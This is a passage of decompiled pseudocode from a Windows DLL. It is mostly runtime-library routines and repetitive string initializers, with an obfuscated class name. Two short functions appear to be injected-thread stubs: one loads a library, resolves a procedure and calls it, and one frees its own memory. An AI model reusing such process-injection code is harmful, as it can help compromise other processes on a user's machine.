        *v19 = v65 | (v20 >> v18);
        ++v70;
        v65 = v64 << v21;
      }
      while ( v70 < 3 );
      v22 = 2;
      v23 = &v62 - v17;
      do
      {
        if ( v22 < v17 )
          *(&v60 + v22) = 0;
        else
          *(&v60 + v22) = *v23;
        --v22;
        --v23;
      }
      while ( v22 >= 0 );
      v24 = dword_1012FC30 - 1;
      v25 = dword_1012FC30 / 32;
      v65 = dword_1012FC30 / 32;
      v26 = &v60 + dword_1012FC30 / 32;
      v64 = 31 - dword_1012FC30 % 32;
      if ( ((1 << (31 - dword_1012FC30 % 32)) & *v26) != 0 )
      {
        for ( j = (~(-1 << (31 - dword_1012FC30 % 32)) & *(&v60 + v25)) == 0; j; j = *(&v60 + v25) == 0 )
        {
          if ( ++v25 >= 3 )
            goto LABEL_52;
        }
        v28 = v24 / 32;
        v71 = 0;
        v29 = 1 << (31 - v24 % 32);
        v30 = &v60 + v24 / 32;
        v31 = *v30 + v29;
        if ( v31 < *v30 || v31 < v29 )
          v71 = 1;
        *v30 = v31;
        for ( k = v71; --v28 >= 0 && k; k = v35 )
        {
          v33 = &v60 + v28;
          v34 = *v33 + 1;
          v35 = 0;
          if ( v34 < *v33 || *v33 == -1 )
            v35 = 1;
          *v33 = v34;
        }
      }
LABEL_52:
      *v26 &= -1 << v64;
      if ( v65 + 1 < 3 )
        memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
      v36 = (dword_1012FC34 + 1) / 32;
      v37 = (dword_1012FC34 + 1) % 32;
      v65 = 0;
      v72 = 0;
      v67 = 32 - v37;
      do
      {
        v38 = &v60 + v72;
        v39 = *v38;
        v64 = ~(-1 << v37) & *v38;
        v40 = v67;
        *v38 = v65 | (v39 >> v37);
        ++v72;
        v65 = v64 << v40;
      }
      while ( v72 < 3 );
      v41 = 2;
      v42 = &v62 - v36;
      do
      {
        if ( v41 < v36 )
          *(&v60 + v41) = 0;
        else
          *(&v60 + v41) = *v42;
        --v41;
        --v42;
      }
      while ( v41 >= 0 );
    }
    else
    {
      v60 = 0;
      v61 = 0;
      v62 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_79;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v60 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_79;
    }
  }
  v60 = 0;
  v61 = 0;
  v62 = 0;
  result = 2;
LABEL_79:
  v55 = v60 | (v63 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_1012FC34));
  if ( dword_1012FC38 == 64 )
  {
    v56 = v61;
    a2[1] = v55;
    *a2 = v56;
  }
  else if ( dword_1012FC38 == 32 )
  {
    *a2 = v55;
  }
  return result;
}
// 1012FC28: using guessed type int dword_1012FC28;
// 1012FC2C: using guessed type int dword_1012FC2C;
// 1012FC30: using guessed type int dword_1012FC30;
// 1012FC34: using guessed type int dword_1012FC34;
// 1012FC38: using guessed type int dword_1012FC38;
// 1012FC3C: using guessed type int dword_1012FC3C;

//----- (1009A021) --------------------------------------------------------
void **sub_1009A021()
{
  return &off_1012FC40;
}
// 1012FC40: using guessed type void *off_1012FC40;

//----- (1009AA1E) --------------------------------------------------------
int __cdecl sub_1009AA1E(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_1012FEE4;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10093596: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1012FEE4: using guessed type int dword_1012FEE4;

//----- (1009AA52) --------------------------------------------------------
int __cdecl sub_1009AA52(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_1012FEE8;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10093596: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1012FEE8: using guessed type int dword_1012FEE8;

//----- (1009AA86) --------------------------------------------------------
int __cdecl sub_1009AA86(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_1012FEE0;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10093596: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1012FEE0: using guessed type int dword_1012FEE0;

//----- (1009AABA) --------------------------------------------------------
int *sub_1009AABA()
{
  return &dword_1012FEE4;
}
// 1012FEE4: using guessed type int dword_1012FEE4;

//----- (1009AAC0) --------------------------------------------------------
int *sub_1009AAC0()
{
  return &dword_1012FEE8;
}
// 1012FEE8: using guessed type int dword_1012FEE8;

//----- (1009AAC6) --------------------------------------------------------
int *sub_1009AAC6()
{
  return &dword_1012FEE0;
}
// 1012FEE0: using guessed type int dword_1012FEE0;

//----- (1009AACC) --------------------------------------------------------
void **sub_1009AACC()
{
  return &off_1012FF70;
}
// 1012FF70: using guessed type void *off_1012FF70;

//----- (1009B67B) --------------------------------------------------------
int __cdecl sub_1009B67B(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_10097A5D(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 1009C3A1: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1009B67B: using guessed type char var_28[4];
// 1009B67B: using guessed type unsigned __int16 var_10[6];

//----- (1009B721) --------------------------------------------------------
int __cdecl sub_1009B721(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_10097F9F(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 1009C3A1: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1009B721: using guessed type char var_28[4];
// 1009B721: using guessed type unsigned __int16 var_10[6];

//----- (1009BFCC) --------------------------------------------------------
int sub_1009BFCC()
{
  return flsall(1);
}
// 1009BEF2: using guessed type _DWORD __cdecl flsall(_DWORD);

//----- (1009E999) --------------------------------------------------------
void __thiscall sub_1009E999(void *this)
{
  *(_DWORD *)this = &ikc::rnp_nhgjjqmxr::`vftable';
  sub_1009166F(this);
}
// 100FBF24: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (1009E9A4) --------------------------------------------------------
_DWORD *__thiscall sub_1009E9A4(_DWORD *Block, char a2)
{
  *Block = &ikc::rnp_nhgjjqmxr::`vftable';
  sub_1009166F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100FBF24: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (1009F53A) --------------------------------------------------------
std::exception *__thiscall sub_1009F53A(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::rnp_nhgjjqmxr::`vftable';
  return this;
}
// 100FBF24: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (1009FFBF) --------------------------------------------------------
void sub_1009FFBF()
{
  ;
}

//----- (1009FFCE) --------------------------------------------------------
void sub_1009FFCE()
{
  ;
}

//----- (100A05A1) --------------------------------------------------------
void __cdecl sub_100A05A1(int a1)
{
  int v2; // edi
  int v3; // eax
  void (__cdecl *v4)(int, int); // eax
  int v5; // [esp-4h] [ebp-14h]
  int v6; // [esp+18h] [ebp+8h]

  v5 = *(_DWORD *)(a1 + 24);
  v6 = *(_DWORD *)(a1 + 4);
  v2 = (*(int (__cdecl **)(int, _DWORD, int))a1)(2032639, 0, v5);
  v3 = (*(int (__cdecl **)(int))(a1 + 12))(a1 + 28);
  if ( v3 )
  {
    v4 = (void (__cdecl *)(int, int))(*(int (__cdecl **)(int, int))(a1 + 16))(v3, a1 + 39);
    if ( v4 )
      v4(v2, a1 + 20);
  }
  __asm { retn }
}
// 100A05FD: unbalanced stack, ignored a potential tail call

//----- (100A0607) --------------------------------------------------------
int __stdcall sub_100A0607(int a1)
{
  int v1; // ebx
  void (__stdcall *v2)(int); // esi
  int (__stdcall *v3)(int); // edi
  int v4; // eax

  v1 = *(_DWORD *)(a1 + 12);
  v2 = *(void (__stdcall **)(int))(a1 + 4);
  v3 = *(int (__stdcall **)(int))(a1 + 8);
  (*(void (__stdcall **)(int, _DWORD, int))a1)(a1, 0, 0x8000);
  v4 = v3(v1);
  v2(v4);
  return 0;
}

//----- (100C504B) --------------------------------------------------------
int sub_100C504B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017DAB8);
  sub_1000D17D(dword_101864D4, v0);
  return atexit(sub_100F2F06);
}
// 101864D4: using guessed type _DWORD dword_101864D4[2];

//----- (100C506D) --------------------------------------------------------
int sub_100C506D()
{
  sub_1000D17D(&dword_10193B3C, &word_1017DB00);
  return atexit(sub_100F2F10);
}
// 10193B3C: using guessed type int dword_10193B3C;

//----- (100C5088) --------------------------------------------------------
int sub_100C5088()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A888);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_1018653C, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F2F1A);
}
// 1018653C: using guessed type _DWORD dword_1018653C[2];

//----- (100C50E4) --------------------------------------------------------
int sub_100C50E4()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A8D4);
  sub_1000D17D(dword_1018667C, v0);
  return atexit(sub_100F2F24);
}
// 1018667C: using guessed type _DWORD dword_1018667C[2];

//----- (100C5106) --------------------------------------------------------
int sub_100C5106()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A908);
  sub_1000D17D(dword_10186734, v0);
  return atexit(sub_100F2F2E);
}
// 10186734: using guessed type _DWORD dword_10186734[2];

//----- (100C5128) --------------------------------------------------------
int sub_100C5128()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A93C);
  sub_1000D17D(dword_10186794, v0);
  return atexit(sub_100F2F38);
}
// 10186794: using guessed type _DWORD dword_10186794[2];

//----- (100C514A) --------------------------------------------------------
int sub_100C514A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A96C);
  sub_1000D17D(dword_10186804, v0);
  return atexit(sub_100F2F42);
}
// 10186804: using guessed type _DWORD dword_10186804[2];

//----- (100C516C) --------------------------------------------------------
int sub_100C516C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A99C);
  sub_1000D17D(dword_10186584, v0);
  return atexit(sub_100F2F4C);
}
// 10186584: using guessed type _DWORD dword_10186584[2];

//----- (100C518E) --------------------------------------------------------
int sub_100C518E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017A9CC);
  sub_1000D17D(dword_10186624, v0);
  return atexit(sub_100F2F56);
}
// 10186624: using guessed type _DWORD dword_10186624[2];

//----- (100C51B0) --------------------------------------------------------
int sub_100C51B0()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AA04);
  sub_1000D17D(dword_1018666C, v0);
  return atexit(sub_100F2F60);
}
// 1018666C: using guessed type _DWORD dword_1018666C[2];

//----- (100C51D2) --------------------------------------------------------
int sub_100C51D2()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AA38);
  sub_1000D17D(dword_101865FC, v0);
  return atexit(sub_100F2F6A);
}
// 101865FC: using guessed type _DWORD dword_101865FC[2];

//----- (100C51F4) --------------------------------------------------------
int sub_100C51F4()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AA68);
  sub_1000D17D(dword_10186544, v0);
  return atexit(sub_100F2F74);
}
// 10186544: using guessed type _DWORD dword_10186544[2];

//----- (100C5216) --------------------------------------------------------
int sub_100C5216()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AA98);
  sub_1000D17D(dword_101866EC, v0);
  return atexit(sub_100F2F7E);
}
// 101866EC: using guessed type _DWORD dword_101866EC[2];

//----- (100C5238) --------------------------------------------------------
int sub_100C5238()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AAC8);
  sub_1000D17D(dword_10186634, v0);
  return atexit(sub_100F2F88);
}
// 10186634: using guessed type _DWORD dword_10186634[2];

//----- (100C525A) --------------------------------------------------------
int sub_100C525A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AB00);
  sub_1000D17D(dword_1018656C, v0);
  return atexit(sub_100F2F92);
}
// 1018656C: using guessed type _DWORD dword_1018656C[2];

//----- (100C527C) --------------------------------------------------------
int sub_100C527C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AB40);
  sub_1000D17D(dword_1018679C, v0);
  return atexit(sub_100F2F9C);
}
// 1018679C: using guessed type _DWORD dword_1018679C[2];

//----- (100C529E) --------------------------------------------------------
int sub_100C529E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AB80);
  sub_1000D17D(dword_101865DC, v0);
  return atexit(sub_100F2FA6);
}
// 101865DC: using guessed type _DWORD dword_101865DC[2];

//----- (100C52C0) --------------------------------------------------------
int sub_100C52C0()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017ABC8);
  sub_1000D17D(dword_10186574, v0);
  return atexit(sub_100F2FB0);
}
// 10186574: using guessed type _DWORD dword_10186574[2];

//----- (100C52E2) --------------------------------------------------------
int sub_100C52E2()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AC04);
  sub_1000D17D(dword_1018658C, v0);
  return atexit(sub_100F2FBA);
}
// 1018658C: using guessed type _DWORD dword_1018658C[2];

//----- (100C5304) --------------------------------------------------------
int sub_100C5304()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AC3C);
  sub_1000D17D(dword_101867F4, v0);
  return atexit(sub_100F2FC4);
}
// 101867F4: using guessed type _DWORD dword_101867F4[2];

//----- (100C5326) --------------------------------------------------------
int sub_100C5326()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AC80);
  sub_1000D17D(dword_1018678C, v0);
  return atexit(sub_100F2FCE);
}
// 1018678C: using guessed type _DWORD dword_1018678C[2];

//----- (100C5348) --------------------------------------------------------
int sub_100C5348()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017ACD0);
  sub_1000D17D(dword_101867B4, v0);
  return atexit(sub_100F2FD8);
}
// 101867B4: using guessed type _DWORD dword_101867B4[2];

//----- (100C536A) --------------------------------------------------------
int sub_100C536A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AD10);
  sub_1000D17D(dword_10186774, v0);
  return atexit(sub_100F2FE2);
}
// 10186774: using guessed type _DWORD dword_10186774[2];

//----- (100C538C) --------------------------------------------------------
int sub_100C538C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AD4C);
  sub_1000D17D(dword_1018652C, v0);
  return atexit(sub_100F2FEC);
}
// 1018652C: using guessed type _DWORD dword_1018652C[2];

//----- (100C53AE) --------------------------------------------------------
int sub_100C53AE()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AD8C);
  sub_1000D17D(dword_101864F4, v0);
  return atexit(sub_100F2FF6);
}
// 101864F4: using guessed type _DWORD dword_101864F4[2];

//----- (100C53D0) --------------------------------------------------------
int sub_100C53D0()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017ADC8);
  sub_1000D17D(dword_101867C4, v0);
  return atexit(sub_100F3000);
}
// 101867C4: using guessed type _DWORD dword_101867C4[2];

//----- (100C53F2) --------------------------------------------------------
int sub_100C53F2()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AE0C);
  sub_1000D17D(dword_10186554, v0);
  return atexit(sub_100F300A);
}
// 10186554: using guessed type _DWORD dword_10186554[2];

//----- (100C5414) --------------------------------------------------------
int sub_100C5414()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AE40);
  sub_1000D17D(dword_1018664C, v0);
  return atexit(sub_100F3014);
}
// 1018664C: using guessed type _DWORD dword_1018664C[2];

//----- (100C5436) --------------------------------------------------------
int sub_100C5436()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AE84);
  sub_1000D17D(dword_10186654, v0);
  return atexit(sub_100F301E);
}
// 10186654: using guessed type _DWORD dword_10186654[2];

//----- (100C5458) --------------------------------------------------------
int sub_100C5458()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AEB8);
  sub_1000D17D(dword_1018650C, v0);
  return atexit(sub_100F3028);
}
// 1018650C: using guessed type _DWORD dword_1018650C[2];

//----- (100C547A) --------------------------------------------------------
int sub_100C547A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AF00);
  sub_1000D17D(dword_101866BC, v0);
  return atexit(sub_100F3032);
}
// 101866BC: using guessed type _DWORD dword_101866BC[2];

//----- (100C549C) --------------------------------------------------------
int sub_100C549C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AF30);
  sub_1000D17D(dword_101867AC, v0);
  return atexit(sub_100F303C);
}
// 101867AC: using guessed type _DWORD dword_101867AC[2];

//----- (100C54BE) --------------------------------------------------------
int sub_100C54BE()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AF70);
  sub_1000D17D(dword_101866FC, v0);
  return atexit(sub_100F3046);
}
// 101866FC: using guessed type _DWORD dword_101866FC[2];

//----- (100C54E0) --------------------------------------------------------
int sub_100C54E0()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AFA0);
  sub_1000D17D(dword_101865C4, v0);
  return atexit(sub_100F3050);
}
// 101865C4: using guessed type _DWORD dword_101865C4[2];

//----- (100C5502) --------------------------------------------------------
int sub_100C5502()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017AFF0);
  sub_1000D17D(dword_1018659C, v0);
  return atexit(sub_100F305A);
}
// 1018659C: using guessed type _DWORD dword_1018659C[2];

//----- (100C5524) --------------------------------------------------------
int sub_100C5524()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B030);
  sub_1000D17D(dword_1018680C, v0);
  return atexit(sub_100F3064);
}
// 1018680C: using guessed type _DWORD dword_1018680C[2];

//----- (100C5546) --------------------------------------------------------
int sub_100C5546()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B070);
  sub_1000D17D(dword_1018677C, v0);
  return atexit(sub_100F306E);
}
// 1018677C: using guessed type _DWORD dword_1018677C[2];

//----- (100C5568) --------------------------------------------------------
int sub_100C5568()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B0F0);
  sub_1000D17D(dword_101866DC, v0);
  return atexit(sub_100F3078);
}
// 101866DC: using guessed type _DWORD dword_101866DC[2];

//----- (100C558A) --------------------------------------------------------
int sub_100C558A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B140);
  sub_1000D17D(dword_101866E4, v0);
  return atexit(sub_100F3082);
}
// 101866E4: using guessed type _DWORD dword_101866E4[2];

//----- (100C55AC) --------------------------------------------------------
int sub_100C55AC()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B0B4);
  sub_1000D17D(dword_10186784, v0);
  return atexit(sub_100F308C);
}
// 10186784: using guessed type _DWORD dword_10186784[2];

//----- (100C55CE) --------------------------------------------------------
int sub_100C55CE()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B188);
  sub_1000D17D(dword_1018669C, v0);
  return atexit(sub_100F3096);
}
// 1018669C: using guessed type _DWORD dword_1018669C[2];

//----- (100C55F0) --------------------------------------------------------
int sub_100C55F0()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B1B8);
  sub_1000D17D(dword_10186614, v0);
  return atexit(sub_100F30A0);
}
// 10186614: using guessed type _DWORD dword_10186614[2];

//----- (100C5612) --------------------------------------------------------
int sub_100C5612()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B240);
  sub_1000D17D(dword_101865E4, v0);
  return atexit(sub_100F30AA);
}
// 101865E4: using guessed type _DWORD dword_101865E4[2];

//----- (100C5634) --------------------------------------------------------
int sub_100C5634()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B2B8);
  sub_1000D17D(dword_101867A4, v0);
  return atexit(sub_100F30B4);
}
// 101867A4: using guessed type _DWORD dword_101867A4[2];

//----- (100C5656) --------------------------------------------------------
int sub_100C5656()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B30C);
  sub_1000D17D(dword_1018663C, v0);
  return atexit(sub_100F30BE);
}
// 1018663C: using guessed type _DWORD dword_1018663C[2];

//----- (100C5678) --------------------------------------------------------
int sub_100C5678()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B344);
  sub_1000D17D(dword_101865BC, v0);
  return atexit(sub_100F30C8);
}
// 101865BC: using guessed type _DWORD dword_101865BC[2];

//----- (100C569A) --------------------------------------------------------
int sub_100C569A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B374);
  sub_1000D17D(dword_1018671C, v0);
  return atexit(sub_100F30D2);
}
// 1018671C: using guessed type _DWORD dword_1018671C[2];

//----- (100C56BC) --------------------------------------------------------
int sub_100C56BC()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B204);
  sub_1000D17D(dword_1018654C, v0);
  return atexit(sub_100F30DC);
}
// 1018654C: using guessed type _DWORD dword_1018654C[2];

//----- (100C56DE) --------------------------------------------------------
int sub_100C56DE()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B3A4);
  sub_1000D17D(dword_101866D4, v0);
  return atexit(sub_100F30E6);
}
// 101866D4: using guessed type _DWORD dword_101866D4[2];

//----- (100C5700) --------------------------------------------------------
int sub_100C5700()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B3D8);
  sub_1000D17D(dword_101866AC, v0);
  return atexit(sub_100F30F0);
}
// 101866AC: using guessed type _DWORD dword_101866AC[2];

//----- (100C5722) --------------------------------------------------------
int sub_100C5722()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B434);
  sub_1000D17D(dword_101866B4, v0);
  return atexit(sub_100F30FA);
}
// 101866B4: using guessed type _DWORD dword_101866B4[2];

//----- (100C5744) --------------------------------------------------------
int sub_100C5744()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B284);
  sub_1000D17D(dword_10186694, v0);
  return atexit(sub_100F3104);
}
// 10186694: using guessed type _DWORD dword_10186694[2];

//----- (100C5766) --------------------------------------------------------
int sub_100C5766()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B464);
  sub_1000D17D(dword_10186724, v0);
  return atexit(sub_100F310E);
}
// 10186724: using guessed type _DWORD dword_10186724[2];

//----- (100C5788) --------------------------------------------------------
int sub_100C5788()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B498);
  sub_1000D17D(dword_1018651C, v0);
  return atexit(sub_100F3118);
}
// 1018651C: using guessed type _DWORD dword_1018651C[2];

//----- (100C57AA) --------------------------------------------------------
int sub_100C57AA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B4D8);
  sub_1000D17D(dword_1018670C, v0);
  return atexit(sub_100F3122);
}
// 1018670C: using guessed type _DWORD dword_1018670C[2];

//----- (100C57CC) --------------------------------------------------------
int sub_100C57CC()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B510);
  sub_1000D17D(dword_101864EC, v0);
  return atexit(sub_100F312C);
}
// 101864EC: using guessed type _DWORD dword_101864EC[2];

//----- (100C57EE) --------------------------------------------------------
int sub_100C57EE()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B548);
  sub_1000D17D(dword_1018660C, v0);
  return atexit(sub_100F3136);
}
// 1018660C: using guessed type _DWORD dword_1018660C[2];

//----- (100C5810) --------------------------------------------------------
int sub_100C5810()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B580);
  sub_1000D17D(dword_101864E4, v0);
  return atexit(sub_100F3140);
}
// 101864E4: using guessed type _DWORD dword_101864E4[2];

//----- (100C5832) --------------------------------------------------------
int sub_100C5832()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B5B8);
  sub_1000D17D(dword_101867BC, v0);
  return atexit(sub_100F314A);
}
// 101867BC: using guessed type _DWORD dword_101867BC[2];

//----- (100C5854) --------------------------------------------------------
int sub_100C5854()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B5F4);
  sub_1000D17D(dword_101867FC, v0);
  return atexit(sub_100F3154);
}
// 101867FC: using guessed type _DWORD dword_101867FC[2];

//----- (100C5876) --------------------------------------------------------
int sub_100C5876()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B630);
  sub_1000D17D(dword_10186524, v0);
  return atexit(sub_100F315E);
}
// 10186524: using guessed type _DWORD dword_10186524[2];

//----- (100C5898) --------------------------------------------------------
int sub_100C5898()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B660);
  sub_1000D17D(dword_1018662C, v0);
  return atexit(sub_100F3168);
}
// 1018662C: using guessed type _DWORD dword_1018662C[2];

//----- (100C58BA) --------------------------------------------------------
int sub_100C58BA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B694);
  sub_1000D17D(dword_101865F4, v0);
  return atexit(sub_100F3172);
}
// 101865F4: using guessed type _DWORD dword_101865F4[2];

//----- (100C58DC) --------------------------------------------------------
int sub_100C58DC()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B6CC);
  sub_1000D17D(dword_10186814, v0);
  return atexit(sub_100F317C);
}
// 10186814: using guessed type _DWORD dword_10186814[2];

//----- (100C58FE) --------------------------------------------------------
int sub_100C58FE()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017B700);
